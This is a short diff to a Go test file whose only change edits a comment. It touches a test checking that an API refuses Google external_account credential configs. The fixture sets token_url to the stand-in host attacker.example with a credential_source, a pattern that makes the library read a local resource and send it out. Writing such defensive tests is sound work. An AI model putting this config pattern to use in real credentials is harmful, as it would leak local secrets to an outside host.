@@ -547,7 +547,7 @@ func TestNewDeliveryError(t *testing.T) {
 	}
 }
 
-// D9: a credential_source makes the Google library read a local resource and send it to token_url.
+// A credential_source makes the Google library read a local resource and send it to token_url.
 func TestCheckAPIWriteRefusesCredentialSource(t *testing.T) {
 	external := func(source string) string {
 		return `{"type":"external_account","audience":"a","subject_token_type":"t","token_url":"https://attacker.example/token","credential_source":` + source + `}`
